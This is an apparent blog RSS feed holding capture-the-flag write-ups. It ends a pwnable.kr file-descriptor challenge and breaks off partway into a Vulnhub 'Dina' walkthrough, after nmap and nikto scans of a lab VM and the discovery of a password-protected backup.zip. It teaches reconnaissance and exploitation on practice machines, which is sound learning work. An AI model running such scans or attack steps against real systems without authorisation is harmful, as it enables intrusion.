		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass argv[1] a number&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LETMEWIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;good job :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;learn about Linux file IO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By reading it, we get that firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; will convert the argument into the integer, then it will substract from it &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;. After converting it into decimal we get number &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;4660&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After that &lt;code class=&quot;highlighter-rouge&quot;&gt;read(fd, buf, 32)&lt;/code&gt; syscall is executed. First argument of this function &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is the file descriptor of where to read the input. Then &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; is the character array where the read content will be stored and &lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt; is the number of bytes to read before truncating the data. The last step compares the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; with a string &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEWIN\n&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;How can we enter this string to make the condition true? Firstly, we can learn that file descriptor is simply an integer that is used to access a file, or IO resource. Read more at &lt;a href=&quot;https://en.wikipedia.org/wiki/File_descriptor&quot; title=&quot;Wikipedia&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Each Unix process should have three standard &lt;strong&gt;&lt;em&gt;POSIX&lt;/em&gt;&lt;/strong&gt; file descriptors. With respective integers &lt;strong&gt;&lt;em&gt;0&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdout&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;2&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stderr&lt;/em&gt;&lt;/strong&gt;. In our attack we’re going to use &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, since it’s going to allow us to enter characters from the keyboard.&lt;/p&gt;

&lt;p&gt;To make the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; equall to 0, we’re going to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; equall to the &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;. Then substraction will result in 0, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; function will read the characters that we enter.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here goes the flag!&lt;/p&gt;
</description>
        <pubDate>Thu, 23 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-fd/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-fd/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Dina 1</title>
        <description>&lt;p&gt;Let’s quickly jump into another machine from Vulnhub called &lt;strong&gt;Dina&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Dina 1.0.1

________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))

This is my first Boot2Root - CTF VM. I hope you enjoy it.

if you run into any issue you can find me on Twitter: @touhidshaikh22

Contact: touhidshaikh22 at gmaill.com &amp;lt;- Feel Free to write mail

Website: http://www.touhidshaikh.com

Goal: /root/flag.txt

Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don't think need any help).

Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view

Try harder!: If you are confused or frustrated don't forget that enumeration is the key!

Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve!

Tested: This VM was tested with:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/touhid-shaikh,465/&quot;&gt;&lt;b&gt;Touhid Shaikh&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view&quot;&gt;&lt;b&gt;Dina&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Let’s begin by enumerating the ports using &lt;strong&gt;nmap&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#  nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.5

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-18 08:55 EST
NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating ARP Ping Scan at 08:55
Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 08:55, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 08:55
Completed Parallel DNS resolution of 1 host. at 08:55, 0.00s elapsed
Initiating SYN Stealth Scan at 08:55
Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 10.0.2.5
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 5 to 10 due to 24 out of 59 dropped probes since last increase.
SYN Stealth Scan Timing: About 9.80% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:45 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 11.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 14.98% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:36 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 16.87% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:07 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:56 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 18.59% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 20.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:42 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Warning: 10.0.2.5 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
SYN Stealth Scan Timing: About 23.70% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 45.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 51.99% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:33 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 57.71% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:26 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 63.26% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 68.64% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 74.03% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 79.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:51 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 84.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 89.77% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 94.92% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:13 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Completed SYN Stealth Scan at 09:23, 1665.92s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 09:23
Scanning 1 service on 10.0.2.5
Completed Service scan at 09:23, 6.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 service on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.5&lt;/span&gt;
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
NSE: Script scanning 10.0.2.5.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.10s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00059s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Dina
MAC Address: 08:00:27:3A:EC:D6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 0.023 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Sat Nov 18 08:51:09 2017&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Network Distance: 1 hop
TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;250 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.0.2.5

NSE: Script Post-scanning.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1675.39 seconds
           Raw packets sent: 127751 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 137025 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.230MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As you can see, the only service that’s open is &lt;strong&gt;http&lt;/strong&gt;. With that information, we can navigate to it with our browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While looking for clues manually, I decided to run a &lt;strong&gt;nikto&lt;/strong&gt; scan to find some low hanging fruit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.2.5
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        80
+ Start Time:         2017-11-18 08:57:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /, inode: 425463, size: 3618, mtime: Tue Oct 17 09:46:52 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ OSVDB-3268: /ange1/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/ange1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /angel1/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/angel1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /tmp/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/tmp/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /uploads/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/uploads/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 5 entries which should be manually viewed.
+ Uncommon header &lt;span class=&quot;s1&quot;&gt;'tcn'&lt;/span&gt; found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4698ebdc59d15. The following alternatives &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index'&lt;/span&gt; were found: index.html
+ Apache/2.2.22 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /secure/: Directory indexing found.
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8351 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 20 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-11-18 08:58:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And there it is, in &lt;strong&gt;secure&lt;/strong&gt; directory there is a &lt;strong&gt;backup&lt;/strong&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/secure/
backup.zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortuntely, it’s password protected, so let’s keep it in mind and look for some more clues.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: backup.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
